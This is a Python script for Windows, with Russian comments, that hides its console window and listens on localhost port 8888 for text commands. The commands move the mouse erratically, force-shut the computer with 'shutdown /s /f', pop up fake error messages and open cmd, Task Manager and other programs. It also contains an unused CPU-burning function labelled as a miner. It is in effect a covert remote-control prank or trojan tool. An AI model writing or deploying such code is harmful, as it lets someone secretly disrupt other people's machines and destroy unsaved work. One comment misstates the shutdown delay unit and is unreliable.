import socket
import threading
import ctypes
import time
import os
import tkinter as tk
from tkinter import messagebox
import subprocess
import multiprocessing

ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

def safe_shutdown_windows(delay_seconds=0):
    try:
        # shutdown /s — выключение; /t — задержка в сотнях миллисекунд; /f — принудительное закрытие программ
        cmd = ['shutdown', '/s', '/t', str(delay_seconds * 1), '/f']
        result = subprocess.run(cmd, capture_output=True, text=True)
        if result.returncode == 0:
            print(f"Выключение запланировано через {delay_seconds} секунд")
        else:
            print(f"Ошибка: {result.stderr}")
    except Exception as e:
        print(f"Исключение: {e}")

def win_error(title, msg):
    root = tk.Tk()
    root.withdraw()
    messagebox.showerror(title, msg)
    root.destroy()

MOUSEEVENTF_MOVE = 0x0001
MOUSEEVENTF_LEFTDOWN = 0x0002
MOUSEEVENTF_LEFTUP = 0x0004
MOUSEEVENTF_RIGHTDOWN = 0x0008
MOUSEEVENTF_RIGHTUP = 0x0010
MOUSEEVENTF_WHEEL = 0x0800

def move_cursor(x, y):
    """Перемещение курсора в абсолютные координаты."""
    ctypes.windll.user32.SetCursorPos(x, y)

def cpu_worker():
    """Функция для одного рабочего процесса — нагружает одно ядро."""
    while True:
        x = 0
        for i in range(1000000):
            x += i ** 2
        time.sleep(0.001)
        print('запущен майнер')

def handle_client(client_socket):
    while True:
        try:
            data = client_socket.recv(1024).decode()
            if not data:
                break
            print(f"Получена команда: {data}")
            execute_command(data)
        except:
            break
    client_socket.close()

def execute_command(cmd):
    if cmd == "курсор":
        move_cursor(500, 500)
        time.sleep(1)
        move_cursor(300, 400)
        time.sleep(1)
        move_cursor(600, 200)
        time.sleep(1)
        move_cursor(500, 500)
        time.sleep(1)
        move_cursor(300, 400)
        time.sleep(1)
        move_cursor(600, 200)
        time.sleep(1)
        move_cursor(500, 500)
        time.sleep(1)
        move_cursor(300, 400)
        time.sleep(1)
        move_cursor(600, 200)
        time.sleep(1)
        move_cursor(500, 500)
        time.sleep(1)
        move_cursor(300, 400)
        time.sleep(1)
        move_cursor(600, 200)
        time.sleep(1)
        move_cursor(500, 500)
        time.sleep(1)
        move_cursor(300, 400)
        time.sleep(1)
        move_cursor(600, 200)
        time.sleep(1)
        move_cursor(500, 500)
        time.sleep(1)
        move_cursor(300, 400)
        time.sleep(1)
        move_cursor(600, 200)
        time.sleep(1)
    elif cmd == "выкл пк":
        safe_shutdown_windows(3)
    elif cmd == "сообщение":
        win_error("сообщение", "сообщение от некого приложения)")
    elif cmd == "калькулятор":
        os.system('calc')
    elif cmd == "диспетчер задач":
        os.system('taskmgr')
    elif cmd == "блокнот":
        os.system('notepad')
    elif cmd == "проводник":
        os.system('explorer')
    elif cmd == "cmd":
        os.system('cmd')
    elif cmd == "paint":
        os.system('mspaint')
    elif cmd == "панель управления":
        os.system('control')
    elif cmd == "клавиатура":
        os.system('osk')
    else:
        print(f"Неизвестная команда: {cmd}")

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind(('localhost', 8888))
server.listen(5)
print("Сервер запущен, ожидает команд...")

while True:
    client, addr = server.accept()
    print(f"Подключение от {addr}")
    client_handler = threading.Thread(target=handle_client, args=(client,))
    client_handler.start()